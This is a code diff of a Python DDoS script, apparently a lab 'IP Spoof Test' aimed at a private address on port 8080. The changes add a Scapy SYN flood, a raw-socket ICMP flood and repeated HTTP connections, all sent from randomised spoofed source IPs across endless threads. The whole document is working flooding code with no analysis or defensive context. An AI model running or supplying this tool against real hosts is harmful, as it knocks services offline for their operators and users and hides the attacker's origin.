@@ -1,54 +1,57 @@
 #!/usr/bin/python
 import time, os, sys, string, thread, socket
 from impacket import ImpactDecoder, ImpactPacket ##Using custom Python library to help with IP Spoofing
+from scapy.all import *
+conf.verb=0
 
 print("DDoS Attack Starting: IP Spoof Test")
 
 #Our target's IP:
 target_ip = '10.1.1.50'
 port = 8080
-message = "adfasdfasdfasdf"
+message = "12345"
 
 def ddos(src, dst):
-	# create our ImpactPacket 
+	#Create a new IP packet and set its source and destination addresses
+
 	ip = ImpactPacket.IP()
-	# Set up our own src/dst 
 	ip.set_ip_src(src)
 	ip.set_ip_dst(dst)
 
+	#Create a new ICMP packet
+
 	icmp = ImpactPacket.ICMP()
 	icmp.set_icmp_type(icmp.ICMP_ECHO)
-	 
-	# Include a 128 character long payload inside the ICMP packet.
-	icmp.contains(ImpactPacket.Data("O"*128))
-	 
-	# Have the IP packet contain the ICMP packet (along with its payload).
+
+	#inlude a small payload inside the ICMP packet
+	#and have the ip packet contain the ICMP packet
+	icmp.contains(ImpactPacket.Data("O"*100))
 	ip.contains(icmp)
+	n = 0
 
-	seq_id = 0
-	while 1:
-		# Give the ICMP packet the next ID in the sequence.
-		seq_id += 1
-		icmp.set_icmp_id(seq_id)
-		# Calculate its checksum.
+	while(1):
+		print("Spoofing from %s" % src)
+
+		#Using Scapy to SYN flood
+		p1=IP(dst=target_ip,src=src)/TCP(dport=8080,sport=5000,flags='S')
+		send(p1)
+		s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+		s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+
+		#Using ImpactPacket to flood/spoof
+		icmp.set_icmp_id(1)
+		#calculate checksum
 		icmp.set_icmp_cksum(0)
-		icmp.auto_checksum = 1            
-	   # send packet
-		#s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-		#s.connect((dst, port))
-		#s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-		ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		ddos.connect((dst, port))
-		ddos.send("GET /%s HTTP/1.1\r\n" % message)
-		# Send it to the target host.
-		#s.sendto(ip.get_packet(), (dst, 8080))
-		print "sent from %s of sid: %d" % (src,seq_id)
-		continue
+		icmp.auto_checksum = 0
+		s.sendto(ip.get_packet(), (dst, 8080))
 
-# Randomizing IP Values
-for j in range(256):
-	src1 = "192.01." + str(j)
-	for i in range(256):
-	        src = src1 + "." + str(i)
-	        thread.start_new_thread(ddos, (src, target_ip))
-	        time.sleep(0.2)
+		#Regular socket connection
+		ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		ddos.connect((target_ip, port))
+		ddos.send("GET /%s HTTP/1.1\r\n" % message)
+
+# Randomizing IP Values and make new threads
+while(1):
+	src = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
+	thread.start_new_thread(ddos, (src, target_ip))
+	time.sleep(0.1)
